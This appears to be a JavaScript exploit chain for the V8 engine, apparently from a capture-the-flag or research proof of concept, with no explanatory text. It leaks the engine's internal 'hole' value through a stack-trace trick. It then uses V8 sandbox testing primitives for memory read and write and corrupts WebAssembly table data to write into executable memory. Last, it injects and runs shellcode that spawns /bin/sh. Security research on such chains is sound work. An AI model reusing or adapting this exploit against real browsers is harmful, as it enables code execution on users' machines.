pwn_hole = {}
function leak_hole() {
  function load_stack() {
    pwned = pwn_hole
    pwned[0] = stack;
    return pwned;
  }
  Error.captureStackTrace(globalThis);
  Error.prepareStackTrace = function() {
   Reflect.deleteProperty(globalThis, 'stack');
   Reflect.defineProperty(
    globalThis, 'stack',
    {configurable: false, writable: true, enumerable: true, value: 1});
    stack = {};
    for (let i = 0; i < 0x9000; i++) {
      load_stack();
    }
    return stack;
  };
  Reflect.defineProperty(
      globalThis, 'stack',
      {configurable: true, writable: true, enumerable: true, value: undefined});
  delete globalThis.stack;
  load_stack();
  %DebugPrint(pwned[0]);
}
leak_hole();


var sandboxView = new Sandbox.MemoryView(0, 0xfffffff8);
var dataView = new DataView(sandboxView);

function sbx_addrof(obj) {
 return Sandbox.getAddressOf(obj);
}

function sbx_read(addr) {
 addr &= ~1;
 return dataView.getBigUint64(addr, true);
}

function sbx_write(addr, val) {
 addr &= ~1;
 dataView.setBigUint64(addr, val, true);
}

function pwn() {
 const tbl = new WebAssembly.Table({
 initial: 2,
 element: "anyfunc"
});

const importObject = {
env: { jstimes3: (n) => 3 * n, },
js: { tbl }
};
 
var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 10, 2, 96, 1, 127, 1, 127, 96, 0, 1, 127, 2, 27, 2, 3, 101, 110, 118, 8, 106, 115, 116, 105, 109, 101, 115, 51, 0, 0, 2, 106, 115, 3, 116, 98, 108, 1, 112, 0, 2, 3, 5, 4, 1, 1, 0, 0, 7, 16, 2, 6, 116, 105, 109, 101, 115, 50, 0, 3, 3, 112, 119, 110, 0, 4, 9, 8, 1, 0, 65, 0, 11, 2, 1, 2, 10, 24, 4, 4, 0, 65, 42, 11, 5, 0, 65, 211, 0, 11, 4, 0, 65, 16, 11, 6, 0, 65, 16, 16, 0, 11]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module, importObject);
var times2 = instance.exports.times2;


var shellcode_bytes = [49, 246, 72, 187, 47, 98, 105, 110, 47, 47, 115, 104, 86, 83, 84, 95, 106, 59, 88, 49, 210, 15, 5, 144];
console.log(shellcode_bytes.length)
var array_buffer = new ArrayBuffer(24);
var byte_arr = new Uint8Array(array_buffer);
var bigint_arr = new BigInt64Array(array_buffer);
var shellcode = instance.exports.pwn;

var instance_addr = sbx_addrof(instance);
var tbl_addr = sbx_addrof(tbl);
var times2_addr = sbx_addrof(instance.exports.times2);
var shared_info = Number(sbx_read(times2_addr + 0x8) >> 32n);
var data = Number(sbx_read(shared_info) >> 32n);
var instance_and_function_index = sbx_read(data + 0x10);
var instance = instance_and_function_index & 0xFFFFFFFFn;
sbx_write(data + 0x10, (0n << 32n) | instance);


var imported_function_targets_and_ift_size = sbx_read(instance_addr + 0x18);
var imported_function_targets = imported_function_targets_and_ift_size & 0xFFFFFFFFn;
let what_ptr = Number(imported_function_targets) + 0x8;
var rwx = sbx_read(what_ptr);

var indirect_function_tables = Number(sbx_read(instance_addr + 0xc0) >> 32n);
var indirect_function_table = Number(sbx_read(indirect_function_tables + 0x8) & 0xFFFFFFFFn);
var targets_ptr = indirect_function_table + 0x10;
var where_ptr = targets_ptr;
var targets = sbx_read(targets_ptr);
 
 let arb_write = (where, what) => {
  sbx_write(where_ptr, where - 0x8n);
  sbx_write(what_ptr, what);
  tbl.set(1, times2);
  sbx_write(what_ptr, rwx);
  sbx_write(where_ptr, targets);
 };

 for (var i = 0; i < shellcode_bytes.length; ++i) {
   byte_arr[i] = shellcode_bytes[i];
  }

 for (var i = 0; i < shellcode_bytes.length / 8; ++i) {
   arb_write(rwx + 8n * BigInt(i), bigint_arr[i]);
  }

  shellcode();
}

pwn();